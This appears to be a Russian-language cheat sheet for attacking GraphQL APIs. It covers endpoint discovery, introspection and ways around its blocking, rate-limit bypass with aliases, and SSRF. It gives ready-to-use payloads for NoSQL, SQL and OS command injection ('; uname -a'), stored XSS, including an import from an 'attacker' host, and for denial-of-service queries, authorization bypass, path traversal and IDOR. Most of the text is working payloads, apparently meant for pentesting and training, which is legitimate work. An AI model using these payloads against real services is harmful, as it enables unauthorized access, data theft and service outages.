<h1 align="center">☠️CHEAT SHEET☠️</a> 

> Vulns+Recoon
  
# Оглавление
- [Универсальный запрос](#title1)
- [Поиск конечных точек](#title2)
- [Определение движка](#title3)
- [Если не принимает обычные запросы](#title4)
- [Запрос самоанализа](#title5)
- [Обход защиты самоанализа](#title6)
- [Обход ограничения кол-ва запросов](#title7)
- [Проверка CSFR](#title8)
- [Проверка SSRF](#title9)
- [Предложения(Suggestions)](#title10)
- [Утечка структур GraphQL](#title11)
- [Извлечение данных](#title12)
- [Инъекции](#title13)
  - [NoSQL injection](#title131)
  - [SQL injection](#title132)
  - [OS command injection](#title133)
  - [HTML injection](#title134)
  - [Stored XSS](#title135)
- [DOS атаки](#title14)
  - [Способы DOS атаки](#title141)
- [Обход авторизации](#title15)
- [Arbitrary File Write + Path Traversal](#title16)
- [IDOR](#title17)

# <a id="title1">Универсальный запрос</a>

Запрос `{__typename}` к любой конечной точке GraphQL, он будет включать строку `{"data": {"__typename": "query"}}` где-то в своем ответе. Это является доказательством того, что URL-адрес соответствует службе GraphQL

# <a id="title2">Поиск конечных точек</a>
| ... | .../v1 |
|:----------------:|:---------:|
| /graphql | /graphql/v1 |
| /graphiql | /graphiql/v1 |
| /graphql.php | /graphql.php/v1 |
| /graphql/console | /graphql/console/v1 |
| /api | /api/v1 |
| /api/graphql | /api/graphql/v1 |
| /graphql/api | /graphiql/api/v1 |
| /graphql/graphql | /graphql/graphql/v1 |

Также можно использовать этот [список](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt)
или использовать инструмент [graphw00f](https://github.com/dolevf/graphw00f):
```
	python3 graphw00f.py -d -t http://[test_host]/
```

# <a id="title3">Определение движка</a>

Использовать инструмент [graphw00f](https://github.com/dolevf/graphw00f):
```
python3 graphw00f.py -t http://[test_host]/[endpoint] -f
```
Когда graphw00f успешно определяет движок GraphQL, он распечатывает документ матрицы угроз. Этот документ помогает определить какие функции безопасности она предлагает и содержит ли она какие-либо CVE.

# <a id="title4">Если не принимает обычные запросы</a>

Некоторые конечные точки могут принимать альтернативные методы, такие как запросы `GET` или запросы `POST`, которые используют тип содержимого `x-www-form-urlencoded`.

# <a id="title5">Запрос самоанализа</a>

Использовать утилиты для этого, например расширение для Burp - `InQL`.
Либо ручная проверка:
Зонд:
```
{ 
"query": "{__schema{queryType{name}}}" 
}
```
Полный(Если самоанализ включен, но приведенный ниже запрос не выполняется, попробуйте удалить директивы onOperation, onFragmentи onField из структуры запроса):
```
query IntrospectionQuery { 
    __schema { 
        queryType {
            name 
        } 
        mutationType {
            name 
        } 
        subscriptionType { 
            name 
        }
         types {
            ...FullType 
        } 
        directives { 
            name 
            description 
            args { 
                ...InputValue 
            } 
            onOperation #Often needs to be deleted to run query 
            onFragment #Often needs to be deleted to run query 
            onField #Often needs to be deleted to run query 
        } 
    } 
} 

fragment FullType on __Type { 
    kind 
    name 
    description 
    fields(includeDeprecated: true) { 
        name 
        description 
        args { 
            ...InputValue 
        } 
        type { 
            ...TypeRef 
        } 
        isDeprecated 
        deprecationReason 
    } 
    inputFields { 
        ...InputValue 
    } 
    interfaces { 
        ...TypeRef 
    } 
    enumValues(includeDeprecated: true) { 
        name 
        description 
        isDeprecated 
        deprecationReason 
    } 
    possibleTypes { 
        ...TypeRef 
    } 
} 
fragment InputValue on __InputValue { 
    name 
    description 
    type { 
        ...TypeRef 
    } 
    defaultValue 
} 
fragment TypeRef on __Type { 
    kind
    name 
    ofType { 
        kind 
        name 
        ofType { 
            kind 
            name 
            ofType { 
                kind 
                name 
            } 
        } 
    }
}
```
Версия для типа GET:
```
/?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

# <a id="title6">Обход защиты самоанализа</a>

- Запрос GET или запрос POST с типом содержимого x-www-form-urlencoded
- Когда разработчики отключают самоанализ, они могут использовать регулярное выражение для исключения `__schema`, ключевого слова из запросов. Вы должны попробовать такие символы, как *пробелы* , *новые строки* и *запятые* , так как они игнорируются GraphQL, но не ошибочным регулярным выражениям. Пример: изменение `__schema {` на `__schema \n{` (переход на новую строку)

***Эти два способа можно комбинировать между собой***

# <a id="title7">Обход ограничения кол-ва запросов</a>

Использовать серии запросов с псевдонимами.  
Пример:
```
query example($xxx: Int) { 
    login(xxx:$xxx){ 
        true 
    } 
    example1:login(xxx:$xxx){ 
        true 
    } 
    example2:login(xxx:$xxx){ 
        true 
    } 
}
```

# <a id="title8">Проверка CSFR</a>

Если GraphQL принимает запросы `GET` или запросы `POST` с типом содержимого `x-www-form-urlencoded`, то другие пользователи могут быть уязвимы для атаки CSRF. Подробно об атаке написано [тут](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)  
*Примечание: Шаги по построению атаки GraphQL CSRF  и доставке эксплойта такие же как и для «обычных» уязвимостей CSRF.*

# <a id="title9">Проверка SSRF</a>

Если мутация принимает данные по типу “host” и тому подобное, это может быть уязвимо для атаки SSRF.  
Пример:
```
mutation {
    Vuln_SSRF(host:"localhost", port:57130, path:"/", scheme:"http") {
        result
    }
}
```

# <a id="title10">Предложения(Suggestions)</a>

Если в ошибке раскрывается информация такая как: *“There is no entry for 'productInfo'. Did you mean 'productInformation' instead?”*, из этого можно потенциально получить полезную информацию, поскольку ответ фактически выдает действительные части схемы.  
Примеры запросов для выявления ошибок:
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
[Clairvoyance](https://github.com/nikitastupin/clairvoyance) — это инструмент, который использует предложения для автоматического восстановления всей или части схемы GraphQL, даже если самоанализ отключен. Это значительно сокращает время, необходимое для сбора информации из ответов на предложения.
*Примечание: Burp Scanner может автоматически проверять предложения в рамках сканирования. Если найдены активные предложения, Burp Scanner сообщает о проблеме «GraphQL suggestions enabled».*

# <a id="title11">Утечка структур GraphQL</a>

Если самоанализ отключен, попробуйте посмотреть исходный код веб-сайта. Запросы часто предварительно загружаются в браузер в виде библиотек `javascript`. Эти предварительно написанные запросы могут предоставить важную информацию о схеме и использовании каждого объекта и функции. На `Sources` вкладке инструментов разработчика можно искать все файлы, чтобы перечислить, где сохраняются запросы. Иногда даже запросы, защищенные администратором, уже выставлены.
```
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```

# <a id="title12">Извлечение данных</a>

1)Извлечение данных с использованием edges/nodes  
Пример:
```
{
    "query": "query {
        teams{
            total_count,edges{
                node{
                    id,
                    _id,
                    about,
                    handle,
                    state
                }
            }
        }
    }
}
```
2)Извлечение данных с использованием проекций  
*Не забудьте экранировать " внутри опций.*  
Пример:
```
{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
```

# <a id="title13">Инъекции</a>

### <a id="title131">NoSQL injection</a>

Используйте `$regex`, `$ne` внутри параметров.  
Пример:
```
{
    doctors(
        options: "{\"limit\": 1, \"patients.ssn\" :1}",
        search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
        {
            firstName,
            lastName,
            id,
            patients{
                ssn
            }
        }
}
```

### <a id="title132">SQL injection</a>

Можно использовать стандартные методы проверки приложения на SQLi.  
Пример:
```
{
    bacon(id: "1'") {
        id,
        type,
        price
    }
}
```

### <a id="title133">OS command injection</a>

Если в запросе есть параметр который обращается в shell, то возможна инъекция команд.  
Пример:
```
mutation  {
    importPaste(host:"localhost", port:80, path:"/ ; uname -a", scheme:"http"){
        result
    }
}
```
Пример:
```
query {
    systemDiagnostics(username:"admin", password:"password", cmd:"id; ls -l")
}
```

### <a id="title134">HTML injection</a>

Если есть мутация позволяющая создавать или редактировать какие-либо записи, то возможно есть HTML injection.  
Пример:
```
mutation {
    createPaste(title:"<h1>hello!</h1>", content:"zzzz", public:true) {
        paste {
            id
        }
    }
}
```

### <a id="title135">Stored XSS</a>

Если есть мутация позволяющая создавать или редактировать какие-либо записи, то возможно есть stored xss.  
Пример:
```
mutation {
    createPaste(title:"<script>alert(1)</script>", content:"zzzz", public:true) {
        paste {
            id
        }
    }
}
```
Пример с импортом файла:
```
mutation {
    importPaste(host:"attacker", port:80, path:"/xss.html"")
}
```

# <a id="title14">DOS атаки</a>

Факторы для выявление возможных векторов:
- Есть запрос который долго выполняется;
- Есть ссылающиеся друг на друга типы, фрагменты(построение кругового запроса);
- Нет анализа затрат;
- Нет удаления дублированных полей;
- Нет удаления повторяющихся шаблонов.

### <a id="title141">Способы DOS атаки</a>

**1)Атака пакетного запроса**
```
data = [
{"query":"query {\n  Large\n}"},
{"query":"query {\n  Large\n}"},
{"query":"query {\n  Large\n}"}
]
  
requests.post('http://[test_host]/[endpoint]', json=data)
```
**2)Атака глубоких рекурсивных запросов**
```
query {
    first {
        second {
            first {
                …
            }
        }
    }
}
```
**3)Атака дублирования полей**
```
query {
    first {
        second {
            first {
                func # 1
                func # 2
                func # 3
                ...
                func # 1000
            }
        }
    }
}
```
**4)Атака на основе псевдонимов**
```
query {
    q1: Large
    q2: Large
    q3: Large
}
```
**5)Атака на основе круговых фрагментов**
```
query {
    ...A
}

fragment A on PasteObject {
    content
    title
    ...B
}

fragment B on PasteObject {
    content
    title
    ...A
}
```

# <a id="title15">Обход авторизации</a>

Некоторые запросы могут быть запрещены, для обхода используйте **названия операций**.  
Пример:  
``requests.post('http://host/graphql', json={"query":"query { systemHealth }"})`` *- Отказ в доступе*  
``requests.post('http://host/graphql', json={"query":"query getPastes { systemHealth }"})`` *- Доступ разрешен*

# <a id="title16">Arbitrary File Write + Path Traversal</a>

Если используется мутация для загрузки файла то возможно есть уязвимость Arbitrary File Write либо Path Traversal.  
Пример:
```
mutation {
    uploadPaste(filename:"../../../../../tmp/file.txt", content:"hi"){
        result
    }
}
```

# <a id="title17">IDOR</a>

Попытайтесь изменить значения аргументов таких как *id*.  
Пример:
```
query GetQuery { 
    getSometh(id:22222) { 
        name { 
            login
            password
        } 
    } 
}
```
